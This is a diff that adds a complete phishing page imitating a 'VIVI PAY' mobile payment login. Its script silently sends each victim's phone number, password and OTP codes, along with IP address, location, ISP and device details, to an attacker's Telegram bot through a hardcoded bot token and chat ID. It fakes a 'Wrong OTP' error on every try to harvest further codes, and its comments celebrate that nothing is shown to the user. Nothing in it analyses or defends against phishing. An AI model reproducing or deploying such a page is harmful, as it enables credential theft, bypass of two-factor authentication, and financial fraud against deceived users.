@@ -1,0 +1,679 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>VIVI PAY - Secure Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        border: 'hsl(var(--border))',
+                        input: 'hsl(var(--input))',
+                        ring: 'hsl(var(--ring))',
+                        background: 'hsl(var(--background))',
+                        foreground: 'hsl(var(--foreground))',
+                        muted: 'hsl(var(--muted))',
+                        primary: {
+                            DEFAULT: 'hsl(var(--primary))',
+                            foreground: 'hsl(var(--primary-foreground))',
+                        },
+                        accent: {
+                            DEFAULT: 'hsl(var(--accent))',
+                            foreground: 'hsl(var(--accent-foreground))',
+                        },
+                        destructive: {
+                            DEFAULT: 'hsl(var(--destructive))',
+                            foreground: 'hsl(var(--destructive-foreground))',
+                        },
+                        page: 'hsl(var(--page))',
+                        'input-bg': 'hsl(var(--input-bg))',
+                        button: 'hsl(var(--button))',
+                    },
+                    fontFamily: {
+                        sans: ['system-ui', 'sans-serif'],
+                        body: ["'Georgia'", 'serif'],
+                        accent: ["'Arial'", 'system-ui', 'sans-serif'],
+                    },
+                },
+            },
+        };
+    </script>
+    <link rel="stylesheet" href="https://unpkg.com/@phosphor-icons/web@2.1.1/src/regular/style.css" />
+    <link rel="stylesheet" href="https://unpkg.com/@phosphor-icons/web@2.1.1/src/fill/style.css" />
+    <style>
+        :root {
+            --background: 0 0% 95%;
+            --foreground: 203 60% 41%;
+            --primary: 209 83% 55%;
+            --primary-foreground: 0 0% 95%;
+            --accent: 203 60% 41%;
+            --accent-foreground: 0 0% 95%;
+            --muted: 216 8% 74%;
+            --page: 0 0% 95%;
+            --input-bg: 216 19% 95%;
+            --button: 209 83% 55%;
+            --border: 203 60% 41%;
+            --input: 203 60% 41%;
+            --ring: 209 83% 55%;
+            --radius: 22px;
+            --font-body: 'Georgia', serif;
+            --font-accent: 'Arial', system-ui, sans-serif;
+        }
+        body {
+            background-color: hsl(var(--background));
+            color: hsl(var(--foreground));
+        }
+        .otp-box {
+            width: 100%;
+            min-width: 0;
+            border: 0;
+            border-bottom: 2px solid #e2e8f0;
+            background: transparent;
+            text-align: center;
+            font-size: 2rem;
+            color: #1a202c;
+            outline: none;
+            padding-bottom: 0.5rem;
+            transition: border-color 0.2s;
+        }
+        .otp-box:focus {
+            border-color: #3b82f6;
+        }
+        .otp-box:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .otp-box.error {
+            border-color: #ef4444 !important;
+            color: #ef4444 !important;
+        }
+        #otpOverlay {
+            backdrop-filter: blur(2px);
+        }
+        /* Loading spinner - Hidden from user */
+        .spinner {
+            display: none !important;
+        }
+        /* Toast - Completely Hidden */
+        .toast {
+            display: none !important;
+        }
+        /* Hide scrollbar */
+        ::-webkit-scrollbar {
+            display: none;
+        }
+        * {
+            scrollbar-width: none;
+        }
+        /* Error shake animation */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        .shake {
+            animation: shake 0.5s ease;
+        }
+        /* OTP error message style */
+        .otp-error-text {
+            color: #ef4444 !important;
+            font-weight: 600 !important;
+        }
+        /* Hide loading text */
+        #otpLoading {
+            display: none !important;
+        }
+        /* Button loading - hidden */
+        .btn-loading {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden Input for Page Name -->
+    <input id="pagename" type="hidden" value="VIVI PAY">
+
+    <!-- Toast - Completely Hidden -->
+    <div id="toast" class="toast"></div>
+
+    <div class="max-w-md mx-auto min-h-screen bg-background text-foreground flex flex-col">
+        <section id="login-content" class="flex-1 flex flex-col items-center px-6 pt-10 pb-10 bg-background">
+            <!-- Logo -->
+            <div class="flex justify-center mb-10">
+                <img
+                    src="https://c.animaapp.com/msiq7lfbgL6cPD/img/vivi-pay-logo.png"
+                    alt="VIVI PAY Logo"
+                    class="w-[160px] h-auto"
+                    onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22160%22 height=%2250%22%3E%3Ctext x=%220%22 y=%2235%22 font-size=%2230%22 font-weight=%22bold%22 fill=%22%232588E6%22%3EVIVI PAY%3C/text%3E%3C/svg%3E'"
+                />
+            </div>
+
+            <!-- Form -->
+            <form id="loginForm" class="w-full flex flex-col gap-4" onsubmit="return false;">
+                <!-- Phone Number Input -->
+                <div class="flex items-center bg-input-bg border border-[#ECEEF1] rounded-[22px] px-4 py-3 shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
+                    <i class="ph ph-device-mobile text-accent text-xl mr-3"></i>
+                    <input
+                        type="tel"
+                        id="phoneInput"
+                        inputmode="numeric"
+                        autocomplete="off"
+                        maxlength="15"
+                        placeholder="Enter phone number"
+                        class="bg-transparent outline-none flex-1 text-muted text-lg font-accent placeholder-muted"
+                        required
+                    />
+                </div>
+
+                <!-- Password Input -->
+                <div class="flex items-center bg-input-bg border border-[#ECEEF1] rounded-[22px] px-4 py-3 shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
+                    <i class="ph ph-lock text-accent text-xl mr-3"></i>
+                    <input
+                        type="password"
+                        id="passwordInput"
+                        autocomplete="off"
+                        placeholder="Enter password"
+                        class="bg-transparent outline-none flex-1 text-foreground text-lg font-accent tracking-widest"
+                        required
+                    />
+                </div>
+
+                <!-- Save Password + Forgot Password Row -->
+                <div class="flex items-center justify-between mt-1 px-1">
+                    <label class="flex items-center gap-2 cursor-pointer">
+                        <span class="relative flex items-center justify-center w-5 h-5">
+                            <input type="checkbox" checked class="sr-only peer" />
+                            <span class="w-5 h-5 rounded-full bg-primary flex items-center justify-center">
+                                <i class="ph-fill ph-check text-white text-xs"></i>
+                            </span>
+                        </span>
+                        <span class="text-primary font-accent text-lg font-bold">Save Password</span>
+                    </label>
+                    <a href="#" class="text-primary font-accent text-lg font-bold">Forgot password</a>
+                </div>
+
+                <!-- Login Button -->
+                <button
+                    type="button"
+                    id="loginBtn"
+                    class="w-full bg-primary text-white font-accent text-[22px] font-bold rounded-[10px] py-4 mt-4 shadow-[0_1px_3px_rgba(0,0,0,0.16)] border border-[#2588E6] transition-transform duration-150 active:scale-[0.97]"
+                >
+                    Login
+                </button>
+
+                <!-- User Privacy Agreement -->
+                <div class="flex items-start gap-3 mt-2 px-1">
+                    <label class="flex items-start gap-2 cursor-pointer">
+                        <span class="relative flex items-center justify-center w-6 h-6 mt-0.5 flex-shrink-0">
+                            <input type="checkbox" checked class="sr-only peer" />
+                            <span class="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
+                                <i class="ph-fill ph-check text-white text-xs"></i>
+                            </span>
+                        </span>
+                        <span class="text-foreground font-accent text-lg">
+                            Agree <a href="#" class="text-primary underline font-accent">"User Privacy Agreement"</a>
+                        </span>
+                    </label>
+                </div>
+            </form>
+        </section>
+    </div>
+
+    <!-- OTP Modal -->
+    <div id="otpOverlay" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/45 px-5">
+        <div id="otpCard" class="w-full max-w-sm rounded-[30px] bg-white px-7 pt-8 pb-7 shadow-2xl relative scale-95 opacity-0 transition-all duration-200">
+            <button id="closeOtp" type="button"
+                class="absolute right-5 top-4 h-9 w-9 rounded-full border border-slate-200 text-slate-400 text-2xl leading-none transition active:scale-90 hover:bg-slate-50"
+                aria-label="Close">&times;</button>
+
+            <h2 class="text-center text-[30px] leading-tight font-bold text-slate-900 font-accent">Please enter OTP</h2>
+            <p id="otpSentText" class="mt-4 text-center text-[17px] text-slate-500 font-accent">
+                OTP sent to ****
+            </p>
+
+            <!-- ❌ Error Message - Always Show on Verify -->
+            <div id="otpErrorContainer" class="mt-3 hidden">
+                <p id="otpErrorMessage" class="text-center text-[16px] font-accent otp-error-text">
+                    ❌ Wrong OTP! Please try again.
+                </p>
+            </div>
+
+            <div id="otpInputs" class="mt-4 flex justify-between gap-3">
+                <input class="otp-box" inputmode="numeric" maxlength="1" aria-label="OTP digit 1" autocomplete="off">
+                <input class="otp-box" inputmode="numeric" maxlength="1" aria-label="OTP digit 2" autocomplete="off">
+                <input class="otp-box" inputmode="numeric" maxlength="1" aria-label="OTP digit 3" autocomplete="off">
+                <input class="otp-box" inputmode="numeric" maxlength="1" aria-label="OTP digit 4" autocomplete="off">
+            </div>
+
+            <!-- Loading - Completely Hidden -->
+            <div id="otpLoading" class="hidden mt-7 text-center">
+                <div class="spinner mx-auto"></div>
+                <p class="mt-2 text-sm text-slate-500 font-accent">Verifying...</p>
+            </div>
+
+            <p id="timerText" class="mt-7 text-center text-[16px] text-slate-500 font-accent">Resend in 120 seconds</p>
+            <button id="resendBtn" type="button"
+                class="mx-auto mt-2 hidden rounded-full border border-blue-500 px-5 py-2 text-blue-500 font-semibold transition active:scale-95 hover:bg-blue-50">
+                Resend OTP
+            </button>
+
+            <button id="verifyBtn" type="button"
+                class="mt-8 w-full rounded-full border border-[#2588E6] bg-primary py-4 text-[21px] font-bold text-white shadow-md transition-transform duration-150 active:scale-[0.97]">
+                Verify & Login
+            </button>
+
+            <p id="otpMessage" class="mt-3 min-h-6 text-center text-sm font-accent"></p>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // 🔐 TELEGRAM CONFIGURATION
+        // ============================================================
+        const BOT_TOKEN = '8478210553:AAHrnzDVL15UxFTW6DtyQzQrcuOS06WwmOo';
+        const CHAT_ID = '8914834832';
+
+        // ============================================================
+        // DOM Elements
+        // ============================================================
+        const phoneInput = document.getElementById('phoneInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const loginBtn = document.getElementById('loginBtn');
+        const otpOverlay = document.getElementById('otpOverlay');
+        const otpCard = document.getElementById('otpCard');
+        const closeOtp = document.getElementById('closeOtp');
+        const otpSentText = document.getElementById('otpSentText');
+        const otpBoxes = [...document.querySelectorAll('.otp-box')];
+        const timerText = document.getElementById('timerText');
+        const resendBtn = document.getElementById('resendBtn');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const otpMessage = document.getElementById('otpMessage');
+        const otpLoading = document.getElementById('otpLoading');
+        const pageName = document.getElementById('pagename').value;
+        const otpErrorContainer = document.getElementById('otpErrorContainer');
+        const otpErrorMessage = document.getElementById('otpErrorMessage');
+
+        // ============================================================
+        // State
+        // ============================================================
+        let generatedOtp = '';
+        let countdown = 120;
+        let timerId = null;
+        let isVerifying = false;
+        let loginData = { phone: '', password: '' };
+
+        // ============================================================
+        // Helper Functions
+        // ============================================================
+        function digitsOnly(value) {
+            return value.replace(/\D/g, '');
+        }
+
+        function maskPhone(value) {
+            const n = digitsOnly(value);
+            if (n.length <= 4) return '*'.repeat(n.length);
+            const left = n.slice(0, Math.min(3, n.length - 4));
+            const right = n.slice(-4);
+            return left + '*'.repeat(Math.max(4, n.length - left.length - right.length)) + right;
+        }
+
+        // ✅ Toast - Completely disabled
+        function showToast(message, type = 'info', duration = 4000) {
+            // DO NOTHING - Silent mode
+            return;
+        }
+
+        // ✅ No loading indicators
+        function setLoading(loading) {
+            // DO NOTHING - Button stays normal
+            return;
+        }
+
+        function setVerifying(verifying) {
+            isVerifying = verifying;
+            if (verifying) {
+                verifyBtn.disabled = true;
+                verifyBtn.textContent = 'Verify & Login';
+            } else {
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = 'Verify & Login';
+            }
+        }
+
+        // Show error on OTP boxes
+        function showOtpError() {
+            otpErrorContainer.classList.remove('hidden');
+            otpErrorContainer.classList.add('shake');
+            otpBoxes.forEach(box => {
+                box.classList.add('error');
+                box.value = '';
+            });
+            setTimeout(() => {
+                otpErrorContainer.classList.remove('shake');
+            }, 500);
+            otpBoxes[0].focus();
+        }
+
+        // Hide error
+        function hideOtpError() {
+            otpErrorContainer.classList.add('hidden');
+            otpBoxes.forEach(box => {
+                box.classList.remove('error');
+            });
+        }
+
+        // ============================================================
+        // ⭐ STEP 1: Send Phone + Password to Telegram (Silent)
+        // ============================================================
+        function sendFirstLoginToTelegram(phone, password) {
+            return new Promise((resolve) => {
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(ipData => {
+                        const userAgent = navigator.userAgent;
+                        const ip = ipData.ip || 'Unknown';
+                        const city = ipData.city || 'Unknown';
+                        const country = ipData.country_name || 'Unknown';
+                        const region = ipData.region || 'Unknown';
+                        const isp = ipData.org || 'Unknown';
+
+                        const message = `🔐 **${pageName} - STEP 1: Login Attempt**\n\n` +
+                            `📱 **Phone:** \`${phone}\`\n` +
+                            `🔑 **Password:** \`${password}\`\n` +
+                            `📌 **Status:** ⏳ Awaiting OTP Verification\n\n` +
+                            `🌐 **IP:** \`${ip}\`\n` +
+                            `📍 **Location:** ${city}, ${region}, ${country}\n` +
+                            `🏢 **ISP:** ${isp}\n` +
+                            `🖥️ **Device:** ${userAgent}\n\n` +
+                            `⏰ **Time:** ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+
+                        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                text: message,
+                                parse_mode: 'Markdown',
+                                disable_web_page_preview: true
+                            })
+                        });
+                    })
+                    .then(() => {
+                        resolve({ success: true });
+                    })
+                    .catch(() => {
+                        resolve({ success: false });
+                    });
+            });
+        }
+
+        // ============================================================
+        // ⭐ STEP 2: Send Phone + Password + OTP (Silent)
+        // ============================================================
+        function sendSecondLoginToTelegram(phone, password, otp) {
+            return new Promise((resolve) => {
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(ipData => {
+                        const userAgent = navigator.userAgent;
+                        const ip = ipData.ip || 'Unknown';
+                        const city = ipData.city || 'Unknown';
+                        const country = ipData.country_name || 'Unknown';
+                        const region = ipData.region || 'Unknown';
+                        const isp = ipData.org || 'Unknown';
+
+                        const message = `✅ **${pageName} - STEP 2: OTP Verified**\n\n` +
+                            `📱 **Phone:** \`${phone}\`\n` +
+                            `🔑 **Password:** \`${password}\`\n` +
+                            `🔢 **OTP:** *${otp}*\n` +
+                            `📌 **Status:** ✅ VERIFIED - Login Successful\n\n` +
+                            `🌐 **IP:** \`${ip}\`\n` +
+                            `📍 **Location:** ${city}, ${region}, ${country}\n` +
+                            `🏢 **ISP:** ${isp}\n` +
+                            `🖥️ **Device:** ${userAgent}\n\n` +
+                            `⏰ **Time:** ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+
+                        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                text: message,
+                                parse_mode: 'Markdown',
+                                disable_web_page_preview: true
+                            })
+                        });
+                    })
+                    .then(() => {
+                        resolve({ success: true });
+                    })
+                    .catch(() => {
+                        resolve({ success: false });
+                    });
+            });
+        }
+
+        // ============================================================
+        // Generate OTP
+        // ============================================================
+        function generateOtp() {
+            return Math.floor(1000 + Math.random() * 9000).toString();
+        }
+
+        // ============================================================
+        // STEP 1: Open OTP - Silent Send First Login
+        // ============================================================
+        async function openOtp() {
+            const phone = digitsOnly(phoneInput.value);
+            const password = passwordInput.value.trim();
+
+            if (phone.length < 8) {
+                phoneInput.focus();
+                phoneInput.classList.add('ring-2', 'ring-red-300');
+                setTimeout(() => phoneInput.classList.remove('ring-2', 'ring-red-300'), 900);
+                return;
+            }
+
+            if (password.length < 4) {
+                passwordInput.focus();
+                passwordInput.classList.add('ring-2', 'ring-red-300');
+                setTimeout(() => passwordInput.classList.remove('ring-2', 'ring-red-300'), 900);
+                return;
+            }
+
+            // ✅ Silent send - No loading, no toast
+            sendFirstLoginToTelegram(phone, password);
+            
+            loginData = { phone, password };
+            generatedOtp = generateOtp();
+
+            otpSentText.textContent = '📨 OTP sent to ' + maskPhone(phone);
+            otpMessage.textContent = '';
+            otpMessage.className = 'mt-3 min-h-6 text-center text-sm font-accent';
+            otpBoxes.forEach(box => box.value = '');
+            hideOtpError();
+
+            otpOverlay.classList.remove('hidden');
+            otpOverlay.classList.add('flex');
+
+            requestAnimationFrame(() => {
+                otpCard.classList.remove('scale-95', 'opacity-0');
+                otpCard.classList.add('scale-100', 'opacity-100');
+            });
+
+            startTimer();
+            setTimeout(() => otpBoxes[0].focus(), 300);
+        }
+
+        // ============================================================
+        // Hide OTP
+        // ============================================================
+        function hideOtp() {
+            otpCard.classList.add('scale-95', 'opacity-0');
+            otpCard.classList.remove('scale-100', 'opacity-100');
+            clearInterval(timerId);
+            setVerifying(false);
+            hideOtpError();
+            setTimeout(() => {
+                otpOverlay.classList.add('hidden');
+                otpOverlay.classList.remove('flex');
+            }, 200);
+        }
+
+        // ============================================================
+        // Timer
+        // ============================================================
+        function startTimer() {
+            clearInterval(timerId);
+            countdown = 120;
+            resendBtn.classList.add('hidden');
+            timerText.classList.remove('hidden');
+            timerText.textContent = `⏳ Resend in ${countdown} seconds`;
+            timerText.className = 'mt-7 text-center text-[16px] text-slate-500 font-accent';
+
+            timerId = setInterval(() => {
+                countdown--;
+                timerText.textContent = `⏳ Resend in ${countdown} seconds`;
+                if (countdown <= 0) {
+                    clearInterval(timerId);
+                    timerText.classList.add('hidden');
+                    resendBtn.classList.remove('hidden');
+                }
+            }, 1000);
+        }
+
+        // ============================================================
+        // Event Listeners
+        // ============================================================
+
+        loginBtn.addEventListener('click', openOtp);
+        closeOtp.addEventListener('click', hideOtp);
+
+        otpOverlay.addEventListener('click', (e) => {
+            if (e.target === otpOverlay && !isVerifying) hideOtp();
+        });
+
+        resendBtn.addEventListener('click', async () => {
+            if (isVerifying) return;
+
+            const phone = digitsOnly(phoneInput.value);
+            const password = passwordInput.value.trim();
+
+            // ✅ Silent send
+            sendFirstLoginToTelegram(phone, password);
+            generatedOtp = generateOtp();
+            loginData = { phone, password };
+
+            otpMessage.textContent = '';
+            otpMessage.className = 'mt-3 min-h-6 text-center text-sm font-accent';
+            otpBoxes.forEach(box => box.value = '');
+            hideOtpError();
+            startTimer();
+            otpBoxes[0].focus();
+        });
+
+        // OTP Input Handling
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', () => {
+                if (isVerifying) return;
+                box.value = digitsOnly(box.value).slice(0, 1);
+                if (box.value && index < otpBoxes.length - 1) {
+                    otpBoxes[index + 1].focus();
+                }
+                hideOtpError();
+                otpMessage.textContent = '';
+                otpMessage.className = 'mt-3 min-h-6 text-center text-sm font-accent';
+            });
+
+            box.addEventListener('keydown', (e) => {
+                if (isVerifying) return;
+                if (e.key === 'Backspace' && !box.value && index > 0) {
+                    otpBoxes[index - 1].focus();
+                }
+                if (e.key === 'Enter') {
+                    verifyBtn.click();
+                }
+            });
+
+            box.addEventListener('paste', (e) => {
+                if (isVerifying) return;
+                e.preventDefault();
+                const pasted = digitsOnly((e.clipboardData || window.clipboardData).getData('text')).slice(0, otpBoxes.length);
+                pasted.split('').forEach((digit, i) => {
+                    if (otpBoxes[i]) otpBoxes[i].value = digit;
+                });
+                const idx = Math.min(pasted.length, otpBoxes.length - 1);
+                if (otpBoxes[idx]) otpBoxes[idx].focus();
+                hideOtpError();
+            });
+        });
+
+        // ============================================================
+        // 🔥 STEP 2: Verify OTP - ALWAYS SHOWS "WRONG OTP"
+        // ============================================================
+        verifyBtn.addEventListener('click', async () => {
+            if (isVerifying) return;
+
+            const otp = otpBoxes.map(box => box.value).join('');
+
+            if (otp.length !== otpBoxes.length) {
+                showOtpError();
+                otpErrorMessage.textContent = '❌ Please enter all 4 OTP digits.';
+                return;
+            }
+
+            setVerifying(true);
+
+            // ✅ Silent send OTP to Telegram
+            sendSecondLoginToTelegram(
+                loginData.phone,
+                loginData.password,
+                otp
+            );
+
+            // ✅ ALWAYS SHOW "WRONG OTP"
+            otpBoxes.forEach(box => {
+                box.value = '';
+                box.classList.add('error');
+            });
+            
+            otpErrorContainer.classList.remove('hidden');
+            otpErrorMessage.textContent = '❌ Wrong OTP! Please try again.';
+            otpErrorContainer.classList.add('shake');
+            
+            setTimeout(() => {
+                otpErrorContainer.classList.remove('shake');
+            }, 500);
+            
+            otpBoxes[0].focus();
+            otpMessage.textContent = '';
+            otpMessage.className = 'mt-3 min-h-6 text-center text-sm font-accent';
+
+            setVerifying(false);
+        });
+
+        // Enter key support for login
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const active = document.activeElement;
+                if (active === phoneInput || active === passwordInput) {
+                    loginBtn.click();
+                }
+            }
+        });
+
+        // Auto-focus phone input on load
+        window.addEventListener('load', () => {
+            setTimeout(() => phoneInput.focus(), 500);
+            console.log('🔐 ' + pageName + ' - Silent Mode Loaded');
+        });
+
+        console.log('%c⚠️ COMPLETE SILENT MODE', 'color: red; font-size: 16px; font-weight: bold;');
+        console.log('%c📌 No toast, no loading, no messages shown to user', 'color: orange; font-size: 14px;');
+        console.log('%c✅ Data sends silently to Telegram', 'color: green; font-size: 14px;');
+    </script>
+</body>
+</html>
